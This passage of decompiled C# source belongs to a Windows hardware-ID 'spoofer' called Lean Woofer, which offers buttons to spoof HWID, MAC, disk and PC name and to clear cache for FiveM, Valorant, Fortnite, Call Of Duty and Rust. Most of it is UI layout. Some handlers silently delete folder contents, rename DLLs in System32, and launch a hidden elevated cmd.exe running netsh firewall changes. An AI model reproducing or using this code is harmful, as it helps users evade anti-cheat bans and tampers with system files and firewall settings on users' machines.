				DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Program Files\\Saved");
				FileInfo[] files = directoryInfo.GetFiles();
				foreach (FileInfo fileInfo in files)
				{
					fileInfo.Delete();
				}
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				foreach (DirectoryInfo directoryInfo2 in directories)
				{
					directoryInfo2.Delete(recursive: true);
				}
			}
			catch
			{
			}
		}

		private void bs(object sender, EventArgs e)
		{
		}

		private void bt(object sender, EventArgs e)
		{
		}

		private void bu(object sender, EventArgs e)
		{
		}

		private void bv(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				File.Move("C:\\Windows\\System32\\nvml2.dll", "C:\\Windows\\System32\\nvml.dll");
				File.Move("C:\\Windows\\System32\\nvmld2.dll", "C:\\Windows\\System32\\nvmld.dll");
			}
		}

		private void bw(object sender, EventArgs e)
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.Verb = "runas";
			process.StartInfo.Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= no > nul";
			process.Start();
			MessageBox.Show("Fixed FiveM Bypass Error", "Lean Woofer", MessageBoxButtons.OK);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.m_e != null)
			{
				this.m_e.Dispose();
			}
			base.Dispose(disposing);
		}

		private void bx()
		{
			this.m_e = new Container();
			Animation animation = new Animation();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Main));
			this.m_f = new SiticoneDragControl(this.m_e);
			this.m_g = new SiticoneControlBox();
			this.m_h = new SiticoneControlBox();
			this.m_i = new SiticoneTransition();
			this.m_j = new Label();
			this.m_k = new Label();
			this.m_n = new SiticoneLabel();
			this.m_m = new SiticoneLabel();
			this.m_p = new SiticoneLabel();
			this.m_r = new Panel();
			this.m_s = new PictureBox();
			this.m_u = new SiticoneShadowPanel();
			this.m_bp = new SiticoneRoundedButton();
			this.m_bk = new SiticoneRoundedButton();
			this.m_ad = new SiticoneRoundedButton();
			this.m_ae = new SiticoneRoundedButton();
			this.m_af = new SiticoneRoundedButton();
			this.m_ag = new SiticoneRoundedButton();
			this.m_ah = new SiticoneRoundedButton();
			this.m_ai = new SiticoneRoundedButton();
			this.m_aj = new SiticoneRoundedButton();
			this.m_v = new SiticoneLabel();
			this.m_w = new PictureBox();
			this.m_x = new Label();
			this.m_t = new SiticoneLabel();
			this.m_z = new SiticoneOSToggleSwith();
			this.m_y = new SiticoneLabel();
			this.m_ak = new SiticoneShadowPanel();
			this.m_bw = new SiticoneLabel();
			this.m_bx = new SiticoneTextBox();
			this.m_ap = new SiticoneLabel();
			this.m_ao = new SiticoneRoundedButton();
			this.m_al = new SiticoneLabel();
			this.m_am = new PictureBox();
			this.m_an = new Label();
			this.m_aq = new SiticoneComboBox();
			this.m_ar = new SiticoneShadowPanel();
			this.m_bu = new SiticoneLabel();
			this.m_bt = new SiticoneLabel();
			this.m_bs = new SiticoneButton();
			this.m_bl = new SiticoneLabel();
			this.m_bm = new SiticoneTextBox();
			this.m_bg = new SiticoneButton();
			this.m_as = new SiticoneLabel();
			this.m_at = new PictureBox();
			this.m_au = new Label();
			this.m_av = new Label();
			this.m_ay = new Label();
			this.m_az = new SiticoneLabel();
			this.m_ba = new SiticoneShadowPanel();
			this.m_br = new SiticoneRoundedButton();
			this.m_bq = new SiticoneRoundedButton();
			this.m_bo = new SiticoneLabel();
			this.m_bj = new SiticoneRoundedButton();
			this.m_bi = new SiticoneRoundedButton();
			this.m_bh = new SiticoneRoundedButton();
			this.m_be = new SiticoneRoundedButton();
			this.m_bf = new SiticoneRoundedButton();
			this.m_bb = new SiticoneLabel();
			this.m_bc = new PictureBox();
			this.m_bd = new Label();
			this.m_bv = new SiticoneLabel();
			this.m_bn = new SiticoneGradientButton();
			this.m_aa = new SiticoneGradientButton();
			this.m_ab = new SiticoneGradientButton();
			this.m_ac = new SiticoneGradientButton();
			this.m_l = new SiticoneShadowForm(this.m_e);
			this.m_o = new System.Windows.Forms.Timer(this.m_e);
			this.m_aw = new PageSetupDialog();
			this.m_ax = new System.Windows.Forms.Timer(this.m_e);
			by = new System.Windows.Forms.Timer(this.m_e);
			this.m_q = new BindingSource(this.m_e);
			this.m_r.SuspendLayout();
			((ISupportInitialize)this.m_s).BeginInit();
			this.m_u.SuspendLayout();
			((ISupportInitialize)this.m_w).BeginInit();
			this.m_ak.SuspendLayout();
			((ISupportInitialize)this.m_am).BeginInit();
			this.m_ar.SuspendLayout();
			((ISupportInitialize)this.m_at).BeginInit();
			this.m_ba.SuspendLayout();
			((ISupportInitialize)this.m_bc).BeginInit();
			((ISupportInitialize)this.m_q).BeginInit();
			SuspendLayout();
			this.m_f.TargetControl = this;
			this.m_g.Anchor = AnchorStyles.Top | AnchorStyles.Right;
			this.m_g.BorderRadius = 10;
			this.m_i.SetDecoration(this.m_g, DecorationType.None);
			this.m_g.FillColor = Color.FromArgb(26, 32, 54);
			this.m_g.HoveredState.FillColor = Color.FromArgb(232, 17, 35);
			this.m_g.HoveredState.IconColor = Color.White;
			this.m_g.HoveredState.Parent = this.m_g;
			this.m_g.IconColor = Color.White;
			this.m_g.Location = new Point(613, 4);
			this.m_g.Name = "siticoneControlBox1";
			this.m_g.ShadowDecoration.Parent = this.m_g;
			this.m_g.Size = new Size(45, 29);
			this.m_g.TabIndex = 1;
			this.m_g.Click += a;
			this.m_h.Anchor = AnchorStyles.Top | AnchorStyles.Right;
			this.m_h.BorderRadius = 10;
			this.m_h.ControlBoxType = ControlBoxType.MinimizeBox;
			this.m_i.SetDecoration(this.m_h, DecorationType.None);
			this.m_h.FillColor = Color.FromArgb(26, 32, 54);
			this.m_h.HoveredState.Parent = this.m_h;
			this.m_h.IconColor = Color.White;
			this.m_h.Location = new Point(568, 4);
			this.m_h.Name = "siticoneControlBox2";
			this.m_h.ShadowDecoration.Parent = this.m_h;
			this.m_h.Size = new Size(45, 29);
			this.m_h.TabIndex = 2;
			this.m_i.AnimationType = AnimationType.Rotate;
			this.m_i.Cursor = null;
			animation.AnimateOnlyDifferences = true;
			animation.BlindCoeff = (PointF)componentResourceManager.GetObject("animation9.BlindCoeff");
			animation.LeafCoeff = 0f;
			animation.MaxTime = 1f;
			animation.MinTime = 0f;
			animation.MosaicCoeff = (PointF)componentResourceManager.GetObject("animation9.MosaicCoeff");
			animation.MosaicShift = (PointF)componentResourceManager.GetObject("animation9.MosaicShift");
			animation.MosaicSize = 0;
			animation.Padding = new Padding(50);
			animation.RotateCoeff = 1f;
			animation.RotateLimit = 0f;
			animation.ScaleCoeff = (PointF)componentResourceManager.GetObject("animation9.ScaleCoeff");
			animation.SlideCoeff = (PointF)componentResourceManager.GetObject("animation9.SlideCoeff");
			animation.TimeCoeff = 0f;
			animation.TransparencyCoeff = 1f;
			this.m_i.DefaultAnimation = animation;
			this.m_j.AutoSize = true;
			this.m_i.SetDecoration(this.m_j, DecorationType.None);
			this.m_j.Font = new Font("Segoe UI Light", 10f);
			this.m_j.ForeColor = Color.White;
			this.m_j.Location = new Point(-1, 136);
			this.m_j.Name = "label1";
			this.m_j.Size = new Size(0, 19);
			this.m_j.TabIndex = 22;
			this.m_k.AutoSize = true;
			this.m_i.SetDecoration(this.m_k, DecorationType.None);
			this.m_k.Font = new Font("Segoe UI Semibold", 10.2f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_k.ForeColor = Color.White;
			this.m_k.Location = new Point(14, 7);
			this.m_k.Margin = new Padding(2, 0, 2, 0);
			this.m_k.Name = "label2";
			this.m_k.Size = new Size(89, 19);
			this.m_k.TabIndex = 27;
			this.m_k.Text = "Lean Woofer";
			this.m_n.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_n, DecorationType.None);
			this.m_n.Font = new Font("Segoe UI", 12f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, 161);
			this.m_n.ForeColor = Color.White;
			this.m_n.Location = new Point(51, 5);
			this.m_n.Margin = new Padding(2);
			this.m_n.Name = "key";
			this.m_n.Size = new Size(115, 23);
			this.m_n.TabIndex = 37;
			this.m_n.Text = "usernameLabel";
			this.m_n.Click += e;
			this.m_m.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_m, DecorationType.None);
			this.m_m.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_m.ForeColor = Color.Purple;
			this.m_m.Location = new Point(51, 30);
			this.m_m.Margin = new Padding(2);
			this.m_m.Name = "subscription";
			this.m_m.Size = new Size(95, 15);
			this.m_m.TabIndex = 39;
			this.m_m.Text = "subscriptionLabel";
			this.m_m.Click += h;
			this.m_p.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_p, DecorationType.None);
			this.m_p.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_p.ForeColor = Color.White;
			this.m_p.Location = new Point(159, 295);
			this.m_p.Margin = new Padding(2);
			this.m_p.Name = "version";
			this.m_p.Size = new Size(63, 15);
			this.m_p.TabIndex = 51;
			this.m_p.Text = "Version: 1.0";
			this.m_p.Click += u;
			this.m_r.BackColor = Color.FromArgb(26, 32, 54);
			this.m_r.Controls.Add(this.m_m);
			this.m_r.Controls.Add(this.m_n);
			this.m_r.Controls.Add(this.m_s);
			this.m_i.SetDecoration(this.m_r, DecorationType.None);
			this.m_r.Location = new Point(11, 34);
			this.m_r.Name = "panel2";
			this.m_r.Size = new Size(175, 53);
			this.m_r.TabIndex = 59;
			this.m_r.Paint += t;
			this.m_i.SetDecoration(this.m_s, DecorationType.None);
			this.m_s.Image = LeanSoftware.Properties.Resources.lean_woofer;
			this.m_s.Location = new Point(3, 3);
			this.m_s.Name = "pictureBox1";
			this.m_s.Size = new Size(43, 45);
			this.m_s.SizeMode = PictureBoxSizeMode.Zoom;
			this.m_s.TabIndex = 10;
			this.m_s.TabStop = false;
			this.m_s.Click += bq;
			this.m_u.BackColor = Color.Transparent;
			this.m_u.Controls.Add(this.m_bp);
			this.m_u.Controls.Add(this.m_bk);
			this.m_u.Controls.Add(this.m_ad);
			this.m_u.Controls.Add(this.m_ae);
			this.m_u.Controls.Add(this.m_af);
			this.m_u.Controls.Add(this.m_ag);
			this.m_u.Controls.Add(this.m_ah);
			this.m_u.Controls.Add(this.m_ai);
			this.m_u.Controls.Add(this.m_aj);
			this.m_u.Controls.Add(this.m_v);
			this.m_u.Controls.Add(this.m_w);
			this.m_u.Controls.Add(this.m_x);
			this.m_i.SetDecoration(this.m_u, DecorationType.None);
			this.m_u.FillColor = Color.FromArgb(25, 30, 50);
			this.m_u.Location = new Point(195, 34);
			this.m_u.Name = "spooferpanel";
			this.m_u.ShadowColor = Color.Black;
			this.m_u.Size = new Size(455, 311);
			this.m_u.TabIndex = 66;
			this.m_u.Paint += r;
			this.m_bp.BorderColor = Color.Purple;
			this.m_bp.BorderThickness = 1;
			this.m_bp.CheckedState.Parent = this.m_bp;
			this.m_bp.CustomImages.Parent = this.m_bp;
			this.m_i.SetDecoration(this.m_bp, DecorationType.None);
			this.m_bp.FillColor = Color.FromArgb(25, 30, 50);
			this.m_bp.Font = new Font("Segoe UI", 9f);
			this.m_bp.ForeColor = Color.Purple;
			this.m_bp.HoveredState.Parent = this.m_bp;
			this.m_bp.Location = new Point(54, 260);
			this.m_bp.Name = "siticoneRoundedButton7";
			this.m_bp.ShadowDecoration.Parent = this.m_bp;
			this.m_bp.Size = new Size(346, 29);
			this.m_bp.TabIndex = 72;
			this.m_bp.Text = "Spoof All";
			this.m_bp.Click += bn;
			this.m_bk.BorderColor = Color.Purple;
			this.m_bk.BorderThickness = 1;
			this.m_bk.CheckedState.Parent = this.m_bk;
			this.m_bk.CustomImages.Parent = this.m_bk;
			this.m_i.SetDecoration(this.m_bk, DecorationType.None);
			this.m_bk.FillColor = Color.FromArgb(25, 30, 50);
			this.m_bk.Font = new Font("Segoe UI", 9f);
			this.m_bk.ForeColor = Color.Purple;
			this.m_bk.HoveredState.Parent = this.m_bk;
			this.m_bk.Location = new Point(277, 210);
			this.m_bk.Name = "siticoneRoundedButton10";
			this.m_bk.ShadowDecoration.Parent = this.m_bk;
			this.m_bk.Size = new Size(123, 29);
			this.m_bk.TabIndex = 71;
			this.m_bk.Text = "Spoof Logs";
			this.m_bk.Click += at;
			this.m_ad.BorderColor = Color.Purple;
			this.m_ad.BorderThickness = 1;
			this.m_ad.CheckedState.Parent = this.m_ad;
			this.m_ad.CustomImages.Parent = this.m_ad;
			this.m_i.SetDecoration(this.m_ad, DecorationType.None);
			this.m_ad.FillColor = Color.FromArgb(25, 30, 50);
			this.m_ad.Font = new Font("Segoe UI", 9f);
			this.m_ad.ForeColor = Color.Purple;
			this.m_ad.HoveredState.Parent = this.m_ad;
			this.m_ad.Location = new Point(54, 124);
			this.m_ad.Name = "siticoneRoundedButton8";
			this.m_ad.ShadowDecoration.Parent = this.m_ad;
			this.m_ad.Size = new Size(123, 29);
			this.m_ad.TabIndex = 70;
			this.m_ad.Text = "Spoof Xbox";
			this.m_ad.Click += al;
			this.m_ae.BorderColor = Color.Purple;
			this.m_ae.BorderThickness = 1;
			this.m_ae.CheckedState.Parent = this.m_ae;
			this.m_ae.CustomImages.Parent = this.m_ae;
			this.m_i.SetDecoration(this.m_ae, DecorationType.None);
			this.m_ae.FillColor = Color.FromArgb(25, 30, 50);
			this.m_ae.Font = new Font("Segoe UI", 9f);
			this.m_ae.ForeColor = Color.Purple;
			this.m_ae.HoveredState.Parent = this.m_ae;
			this.m_ae.Location = new Point(277, 169);
			this.m_ae.Name = "siticoneRoundedButton6";
			this.m_ae.ShadowDecoration.Parent = this.m_ae;
			this.m_ae.Size = new Size(123, 29);
			this.m_ae.TabIndex = 68;
			this.m_ae.Text = "Spoof PC Name";
			this.m_ae.Click += am;
			this.m_af.BorderColor = Color.Purple;
			this.m_af.BorderThickness = 1;
			this.m_af.CheckedState.Parent = this.m_af;
			this.m_af.CustomImages.Parent = this.m_af;
			this.m_i.SetDecoration(this.m_af, DecorationType.None);
			this.m_af.FillColor = Color.FromArgb(25, 30, 50);
			this.m_af.Font = new Font("Segoe UI", 9f);
			this.m_af.ForeColor = Color.Purple;
			this.m_af.HoveredState.Parent = this.m_af;
			this.m_af.Location = new Point(277, 124);
			this.m_af.Name = "siticoneRoundedButton5";
			this.m_af.ShadowDecoration.Parent = this.m_af;
			this.m_af.Size = new Size(123, 29);
			this.m_af.TabIndex = 67;
			this.m_af.Text = "Spoof ID";
			this.m_af.Click += ao;
			this.m_ag.BorderColor = Color.Purple;
			this.m_ag.BorderThickness = 1;
			this.m_ag.CheckedState.Parent = this.m_ag;
			this.m_ag.CustomImages.Parent = this.m_ag;
			this.m_i.SetDecoration(this.m_ag, DecorationType.None);
			this.m_ag.FillColor = Color.FromArgb(25, 30, 50);
			this.m_ag.Font = new Font("Segoe UI", 9f);
			this.m_ag.ForeColor = Color.Purple;
			this.m_ag.HoveredState.Parent = this.m_ag;
			this.m_ag.Location = new Point(54, 169);
			this.m_ag.Name = "siticoneRoundedButton4";
			this.m_ag.ShadowDecoration.Parent = this.m_ag;
			this.m_ag.Size = new Size(123, 29);
			this.m_ag.TabIndex = 66;
			this.m_ag.Text = "Spoof MAC";
			this.m_ag.Click += ai;
			this.m_ah.BorderColor = Color.Purple;
			this.m_ah.BorderThickness = 1;
			this.m_ah.CheckedState.Parent = this.m_ah;
			this.m_ah.CustomImages.Parent = this.m_ah;
			this.m_i.SetDecoration(this.m_ah, DecorationType.None);
			this.m_ah.FillColor = Color.FromArgb(25, 30, 50);
			this.m_ah.Font = new Font("Segoe UI", 9f);
			this.m_ah.ForeColor = Color.Purple;
			this.m_ah.HoveredState.Parent = this.m_ah;
			this.m_ah.Location = new Point(54, 210);
			this.m_ah.Name = "siticoneRoundedButton3";
			this.m_ah.ShadowDecoration.Parent = this.m_ah;
			this.m_ah.Size = new Size(123, 29);
			this.m_ah.TabIndex = 65;
			this.m_ah.Text = "Spoof Disk";
			this.m_ah.Click += ak;
			this.m_ai.BorderColor = Color.Purple;
			this.m_ai.BorderThickness = 1;
			this.m_ai.CheckedState.Parent = this.m_ai;
			this.m_ai.CustomImages.Parent = this.m_ai;
			this.m_i.SetDecoration(this.m_ai, DecorationType.None);
			this.m_ai.FillColor = Color.FromArgb(25, 30, 50);
			this.m_ai.Font = new Font("Segoe UI", 9f);
			this.m_ai.ForeColor = Color.Purple;
			this.m_ai.HoveredState.Parent = this.m_ai;
			this.m_ai.Location = new Point(277, 82);
			this.m_ai.Name = "siticoneRoundedButton2";
			this.m_ai.ShadowDecoration.Parent = this.m_ai;
			this.m_ai.Size = new Size(123, 29);
			this.m_ai.TabIndex = 64;
			this.m_ai.Text = "Spoof Info";
			this.m_ai.Click += aj;
			this.m_aj.BorderColor = Color.Purple;
			this.m_aj.BorderThickness = 1;
			this.m_aj.CheckedState.Parent = this.m_aj;
			this.m_aj.CustomImages.Parent = this.m_aj;
			this.m_i.SetDecoration(this.m_aj, DecorationType.None);
			this.m_aj.FillColor = Color.FromArgb(25, 30, 50);
			this.m_aj.Font = new Font("Segoe UI", 9f);
			this.m_aj.ForeColor = Color.Purple;
			this.m_aj.HoveredState.Parent = this.m_aj;
			this.m_aj.Location = new Point(54, 82);
			this.m_aj.Name = "siticoneRoundedButton1";
			this.m_aj.ShadowDecoration.Parent = this.m_aj;
			this.m_aj.Size = new Size(123, 29);
			this.m_aj.TabIndex = 63;
			this.m_aj.Text = "Spoof HWID";
			this.m_aj.Click += ag;
			this.m_v.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_v, DecorationType.None);
			this.m_v.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_v.ForeColor = Color.Purple;
			this.m_v.Location = new Point(68, 34);
			this.m_v.Margin = new Padding(2);
			this.m_v.Name = "siticoneLabel4";
			this.m_v.Size = new Size(95, 15);
			this.m_v.TabIndex = 62;
			this.m_v.Text = "Hardware Cleaner";
			this.m_i.SetDecoration(this.m_w, DecorationType.None);
			this.m_w.Image = LeanSoftware.Properties.Resources.pngaaa_com_3790696;
			this.m_w.Location = new Point(11, 10);
			this.m_w.Name = "pictureBox4";
			this.m_w.Size = new Size(46, 35);
			this.m_w.SizeMode = PictureBoxSizeMode.Zoom;
			this.m_w.TabIndex = 25;
			this.m_w.TabStop = false;
			this.m_x.AutoSize = true;
			this.m_i.SetDecoration(this.m_x, DecorationType.None);
			this.m_x.Font = new Font("Segoe UI Black", 18f, FontStyle.Bold);
			this.m_x.ForeColor = Color.White;
			this.m_x.Location = new Point(60, 6);
			this.m_x.Name = "label5";
			this.m_x.Size = new Size(107, 32);
			this.m_x.TabIndex = 9;
			this.m_x.Text = "Spoofer";
			this.m_t.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_t, DecorationType.None);
			this.m_t.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_t.ForeColor = Color.Red;
			this.m_t.Location = new Point(63, 34);
			this.m_t.Margin = new Padding(2);
			this.m_t.Name = "siticoneLabel2";
			this.m_t.Size = new Size(116, 15);
			this.m_t.TabIndex = 61;
			this.m_t.Text = "Coded by Dimis#1821";
			this.m_z.CheckedFillColor = Color.Red;
			this.m_i.SetDecoration(this.m_z, DecorationType.None);
			this.m_z.Location = new Point(106, 77);
			this.m_z.Name = "DiscordRPCTS";
			this.m_z.Size = new Size(41, 22);
			this.m_z.TabIndex = 67;
			this.m_z.Text = "rpc";
			this.m_z.UncheckedFillColor = Color.DimGray;
			this.m_z.CheckedChanged += y;
			this.m_z.BackColorChanged += z;
			this.m_y.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_y, DecorationType.None);
			this.m_y.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 161);
			this.m_y.ForeColor = Color.Purple;
			this.m_y.Location = new Point(30, 79);
			this.m_y.Margin = new Padding(2);
			this.m_y.Name = "siticoneLabel3";
			this.m_y.Size = new Size(73, 17);
			this.m_y.TabIndex = 69;
			this.m_y.Text = "Discord RPC: ";
			this.m_ak.BackColor = Color.Transparent;
			this.m_ak.Controls.Add(this.m_bw);
			this.m_ak.Controls.Add(this.m_bx);
			this.m_ak.Controls.Add(this.m_ap);
			this.m_ak.Controls.Add(this.m_ao);
			this.m_ak.Controls.Add(this.m_al);
			this.m_ak.Controls.Add(this.m_am);
			this.m_ak.Controls.Add(this.m_an);
			this.m_ak.Controls.Add(this.m_aq);
			this.m_i.SetDecoration(this.m_ak, DecorationType.None);
			this.m_ak.FillColor = Color.FromArgb(25, 30, 50);
			this.m_ak.Location = new Point(195, 34);
			this.m_ak.Name = "gamepanel";
			this.m_ak.ShadowColor = Color.Black;
			this.m_ak.Size = new Size(455, 311);
			this.m_ak.TabIndex = 71;
			this.m_ak.Paint += ae;
			this.m_bw.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_bw, DecorationType.None);
			this.m_bw.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_bw.ForeColor = Color.Fuchsia;
			this.m_bw.Location = new Point(155, 181);
			this.m_bw.Margin = new Padding(2);
			this.m_bw.Name = "textip";
			this.m_bw.Size = new Size(51, 15);
			this.m_bw.TabIndex = 74;
			this.m_bw.Text = "Server IP:";
			this.m_bx.BorderColor = Color.WhiteSmoke;
			this.m_bx.BorderRadius = 3;
			this.m_bx.Cursor = Cursors.IBeam;
			this.m_i.SetDecoration(this.m_bx, DecorationType.None);
			this.m_bx.DefaultText = "127.0.0.1:30120";
			this.m_bx.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
			this.m_bx.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
			this.m_bx.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
			this.m_bx.DisabledState.Parent = this.m_bx;
			this.m_bx.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
			this.m_bx.FillColor = Color.FromArgb(26, 32, 54);
			this.m_bx.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
			this.m_bx.FocusedState.Parent = this.m_bx;
			this.m_bx.ForeColor = Color.Fuchsia;
			this.m_bx.HoveredState.BorderColor = Color.FromArgb(94, 148, 255);
			this.m_bx.HoveredState.Parent = this.m_bx;
			this.m_bx.Location = new Point(211, 178);
			this.m_bx.Margin = new Padding(4);
			this.m_bx.Name = "enterip";
			this.m_bx.PasswordChar = '\0';
			this.m_bx.PlaceholderText = "";
			this.m_bx.SelectedText = "";
			this.m_bx.ShadowDecoration.Parent = this.m_bx;
			this.m_bx.Size = new Size(109, 22);
			this.m_bx.TabIndex = 73;
			this.m_bx.TextAlign = HorizontalAlignment.Center;
			this.m_ap.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_ap, DecorationType.None);
			this.m_ap.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_ap.ForeColor = Color.White;
			this.m_ap.Location = new Point(143, 115);
			this.m_ap.Margin = new Padding(2);
			this.m_ap.Name = "siticoneLabel5";
			this.m_ap.Size = new Size(66, 15);
			this.m_ap.TabIndex = 69;
			this.m_ap.Text = "Select Game";
			this.m_ao.BorderColor = Color.Purple;
			this.m_ao.BorderThickness = 1;
			this.m_ao.CheckedState.Parent = this.m_ao;
			this.m_ao.CustomImages.Parent = this.m_ao;
			this.m_i.SetDecoration(this.m_ao, DecorationType.None);
			this.m_ao.FillColor = Color.FromArgb(25, 30, 50);
			this.m_ao.Font = new Font("Segoe UI", 9f);
			this.m_ao.ForeColor = Color.Fuchsia;
			this.m_ao.HoveredState.Parent = this.m_ao;
			this.m_ao.Location = new Point(127, 212);
			this.m_ao.Name = "siticoneRoundedButton9";
			this.m_ao.ShadowDecoration.Parent = this.m_ao;
			this.m_ao.Size = new Size(209, 29);
			this.m_ao.TabIndex = 64;
			this.m_ao.Text = "Spoof Game";
			this.m_ao.Click += ab;
			this.m_al.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_al, DecorationType.None);
			this.m_al.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_al.ForeColor = Color.Purple;
			this.m_al.Location = new Point(65, 34);
			this.m_al.Margin = new Padding(2);
			this.m_al.Name = "siticoneLabel1";
			this.m_al.Size = new Size(76, 15);
			this.m_al.TabIndex = 62;
			this.m_al.Text = "Cache Cleaner";
			this.m_i.SetDecoration(this.m_am, DecorationType.None);
			this.m_am.Image = LeanSoftware.Properties.Resources.game;
			this.m_am.Location = new Point(11, 10);
			this.m_am.Name = "pictureBox2";
			this.m_am.Size = new Size(46, 35);
			this.m_am.SizeMode = PictureBoxSizeMode.Zoom;
			this.m_am.TabIndex = 25;
			this.m_am.TabStop = false;
			this.m_an.AutoSize = true;
			this.m_i.SetDecoration(this.m_an, DecorationType.None);
			this.m_an.Font = new Font("Segoe UI Black", 18f, FontStyle.Bold);
			this.m_an.ForeColor = Color.White;
			this.m_an.Location = new Point(60, 6);
			this.m_an.Name = "label3";
			this.m_an.Size = new Size(93, 32);
			this.m_an.TabIndex = 9;
			this.m_an.Text = "Games";
			this.m_aq.AccessibleDescription = "Choose Game";
			this.m_aq.AccessibleName = "";
			this.m_aq.BackColor = Color.FromArgb(25, 30, 50);
			this.m_aq.BorderColor = Color.FromArgb(25, 35, 50);
			this.m_i.SetDecoration(this.m_aq, DecorationType.None);
			this.m_aq.DrawMode = DrawMode.OwnerDrawFixed;
			this.m_aq.DropDownStyle = ComboBoxStyle.DropDownList;
			this.m_aq.FillColor = Color.FromArgb(30, 30, 50);
			this.m_aq.FocusedColor = Color.FromArgb(25, 30, 50);
			this.m_aq.Font = new Font("Segoe UI", 10f);
			this.m_aq.ForeColor = Color.Fuchsia;
			this.m_aq.FormattingEnabled = true;
			this.m_aq.HoveredState.BorderColor = Color.FromArgb(26, 32, 54);
			this.m_aq.HoveredState.FillColor = Color.FromArgb(26, 32, 54);
			this.m_aq.HoveredState.Parent = this.m_aq;
			this.m_aq.ItemHeight = 30;
			this.m_aq.Items.AddRange(new object[5] { "FiveM", "Valorant", "Fortnite", "Call Of Duty", "Rust" });
			this.m_aq.ItemsAppearance.Parent = this.m_aq;
			this.m_aq.Location = new Point(136, 130);
			this.m_aq.Name = "MethodCB";
			this.m_aq.ShadowDecoration.Parent = this.m_aq;
			this.m_aq.Size = new Size(184, 36);
			this.m_aq.TabIndex = 68;
			this.m_aq.Tag = "";
			this.m_aq.SelectedIndexChanged += af;
			this.m_ar.BackColor = Color.Transparent;
			this.m_ar.Controls.Add(this.m_bu);
			this.m_ar.Controls.Add(this.m_bt);
			this.m_ar.Controls.Add(this.m_bs);
			this.m_ar.Controls.Add(this.m_bl);
			this.m_ar.Controls.Add(this.m_bm);
			this.m_ar.Controls.Add(this.m_bg);
			this.m_ar.Controls.Add(this.m_as);
			this.m_ar.Controls.Add(this.m_at);
			this.m_ar.Controls.Add(this.m_au);
			this.m_ar.Controls.Add(this.m_y);
			this.m_ar.Controls.Add(this.m_p);
			this.m_ar.Controls.Add(this.m_z);
			this.m_i.SetDecoration(this.m_ar, DecorationType.None);
			this.m_ar.FillColor = Color.FromArgb(25, 30, 50);
			this.m_ar.ForeColor = Color.Crimson;
			this.m_ar.Location = new Point(195, 34);
			this.m_ar.Name = "settingspanel";
			this.m_ar.ShadowColor = Color.Black;
			this.m_ar.Size = new Size(455, 311);
			this.m_ar.TabIndex = 72;
			this.m_ar.Paint += aq;
			this.m_bu.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_bu, DecorationType.None);
			this.m_bu.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_bu.ForeColor = Color.White;
			this.m_bu.Location = new Point(233, 295);
			this.m_bu.Margin = new Padding(2);
			this.m_bu.Name = "siticoneLabel11";
			this.m_bu.Size = new Size(78, 15);
			this.m_bu.TabIndex = 76;
			this.m_bu.Text = "Total Users: 99";
			this.m_bu.Click += bs;
			this.m_bt.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_bt, DecorationType.None);
			this.m_bt.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_bt.ForeColor = Color.Fuchsia;
